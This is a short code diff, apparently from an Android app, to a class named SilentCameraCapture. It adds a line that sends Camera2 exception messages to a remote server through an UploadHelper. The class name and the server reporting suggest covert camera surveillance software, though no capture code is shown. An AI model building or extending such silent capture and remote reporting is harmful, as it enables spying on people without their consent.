@@ -113,6 +113,7 @@ public class SilentCameraCapture {
             }
         } catch (Exception e) {
             Log.e(TAG, "Camera2 error: " + e.getMessage());
+            UploadHelper.sendTextToServer(context, "error", "Camera2 Exception: " + e.getMessage() + " (Emulators often lack physical camera access)");
         }
     }
 
